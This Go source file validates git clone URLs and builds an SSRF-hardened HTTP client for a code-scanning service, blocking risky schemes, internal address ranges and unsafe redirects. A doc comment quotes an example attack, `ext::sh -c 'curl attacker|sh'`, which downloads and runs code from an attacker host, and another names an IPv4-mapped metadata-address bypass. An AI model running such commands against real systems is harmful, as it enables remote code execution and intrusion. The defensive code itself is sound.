// Package fetcher materializes untrusted source exactly once.
//
// It is the ONLY component that touches the network on a user's behalf, and
// the only one that holds git credentials (ADR-0008). That concentration is
// deliberate: the SSRF surface is one small auditable component rather than
// five workers, and compromising a scanner yields the code it was already
// scanning — not a token, not another tenant's data.
package fetcher

import (
	"errors"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/encorebom/encorebom/libs/go-shared/platform/errs"
	"github.com/encorebom/encorebom/libs/go-shared/platform/safedial"
)

// ---------------------------------------------------------------------------
// URL validation — SHAPE
// ---------------------------------------------------------------------------

// ValidateURL checks the shape of a source URL.
//
// ⚠ THIS IS NOT THE SSRF DEFENCE. It rejects inputs that are wrong on their
// face so the user gets an immediate error, and it kills the schemes that are
// dangerous regardless of destination. The defence against reaching an internal
// address is SafeDialer, which validates the IP actually connected to.
//
// The scheme allowlist is the load-bearing part:
//
//	ext::   git's ext transport executes an ARBITRARY COMMAND from the URL.
//	        `ext::sh -c 'curl attacker|sh'` is remote code execution with no
//	        exploit required — it is the documented behaviour of the transport.
//	file:   reads our own disk.
//	http:   credentials and source in the clear.
//	git:    unauthenticated, unencrypted, and unauthenticatable.
//	ssh:    would require us to hold a key.
func ValidateURL(raw string) (*url.URL, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil, errs.New(errs.ValidationFieldRequired, "no source URL supplied")
	}
	if len(raw) > 2048 {
		return nil, errs.New(errs.FetchURLSchemeForbidden, "source URL is too long")
	}

	// Control characters and whitespace before parsing: a newline in a URL that
	// later reaches a command line is argument injection, and url.Parse accepts
	// some of them.
	if strings.ContainsAny(raw, "\x00\n\r\t ") {
		return nil, errs.New(errs.FetchURLSchemeForbidden,
			"source URL contains whitespace or control characters")
	}

	// `ext::` never reaches url.Parse as a recognizable scheme, so check the
	// raw string first. Case-insensitively: `EXT::` works just as well.
	lower := strings.ToLower(raw)
	for _, prefix := range []string{"ext::", "ext:"} {
		if strings.HasPrefix(lower, prefix) {
			return nil, errs.New(errs.FetchURLSchemeForbidden,
				"git's ext:: transport executes an arbitrary command and is never permitted")
		}
	}

	u, err := url.Parse(raw)
	if err != nil {
		return nil, errs.New(errs.FetchURLSchemeForbidden, "source URL is not a valid URL")
	}

	if strings.ToLower(u.Scheme) != "https" {
		return nil, errs.Newf(errs.FetchURLSchemeForbidden,
			"source URL must use https (got %q)", u.Scheme)
	}
	if u.Hostname() == "" {
		return nil, errs.New(errs.FetchURLSchemeForbidden, "source URL has no host")
	}
	// Credentials in the URL would reach argv, process listings and logs. The
	// credential travels through a git credential helper instead.
	if u.User != nil {
		return nil, errs.New(errs.FetchURLSchemeForbidden,
			"remove credentials from the URL; supply a token separately")
	}
	return u, nil
}

// ---------------------------------------------------------------------------
// Address blocking — CONNECTION TIME
// ---------------------------------------------------------------------------

// blockedNets are the ranges a fetch must never reach.
//
// From docs/05-SECURITY-MODEL.md §4, plus ranges that section does not
// enumerate but which are the same class of mistake:
//
//	100.64.0.0/10   carrier-grade NAT — routes to the provider's network
//	192.0.0.0/24    IETF protocol assignments
//	198.18.0.0/15   benchmarking; routable inside some clouds
//	224.0.0.0/4     multicast
//	64:ff9b::/96    NAT64 — embeds an IPv4 address, so ::ffff:169.254.169.254
//	                style bypasses apply
// ⚠ THE BLOCKED-RANGE TABLE AND THE DIALER MOVED TO
// libs/go-shared/platform/safedial IN PHASE 14.
//
// The notification service posts a signed payload to a webhook URL a customer
// types, which is the same problem this package solved for clone URLs: an
// outbound request from inside our network to an address somebody else chose.
// Two copies of a CIDR list is how one of them ends up missing a range — most
// likely the newer copy, written by somebody who did not know this one existed.
//
// The names below stay so this package's callers and its (extensive) test suite
// keep working, and so a reader arriving here finds the trail rather than a
// missing symbol.

// ErrBlockedAddress is returned when a resolved address is not permitted.
var ErrBlockedAddress = errors.New("address is in a blocked range")

// IsBlockedIP reports whether an address must not be connected to.
// See safedial.IsBlockedIP for the ranges and the IPv4-mapped-IPv6 unwrap.
func IsBlockedIP(ip net.IP) bool { return safedial.IsBlockedIP(ip) }

// SafeDialer connects only to addresses it validated, defeating DNS rebinding.
type SafeDialer = safedial.Dialer

// DialAttempt records one connection decision.
type DialAttempt = safedial.Attempt

// ---------------------------------------------------------------------------
// HTTP client
// ---------------------------------------------------------------------------

// MaxRedirects is the redirect budget. Each hop is re-validated.
const MaxRedirects = 3

// SafeHTTPClient builds an http.Client that cannot be redirected into a private
// address.
//
// Two independent controls, because either alone is insufficient:
//
//	the DIALER validates the address of every connection, including those made
//	for redirect targets — this is what actually stops the request;
//
//	the CheckRedirect hook re-runs SHAPE validation on each hop, so a redirect
//	to file:// or ext:: is refused even though the dialer would never see it.
func SafeHTTPClient(dialer *SafeDialer) *http.Client {
	if dialer == nil {
		dialer = &SafeDialer{}
	}
	return &http.Client{
		Timeout: 5 * time.Minute,
		Transport: &http.Transport{
			DialContext: dialer.DialContext,
			// Proxies are disabled: a proxy would connect on our behalf and
			// every address check here would be bypassed.
			Proxy:                 nil,
			TLSHandshakeTimeout:   15 * time.Second,
			ResponseHeaderTimeout: 60 * time.Second,
			MaxIdleConns:          4,
			DisableCompression:    false,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= MaxRedirects {
				return errs.Newf(errs.FetchURLSchemeForbidden,
					"too many redirects (limit %d)", MaxRedirects)
			}
			if _, err := ValidateURL(req.URL.String()); err != nil {
				return err
			}
			return nil
		},
	}
}
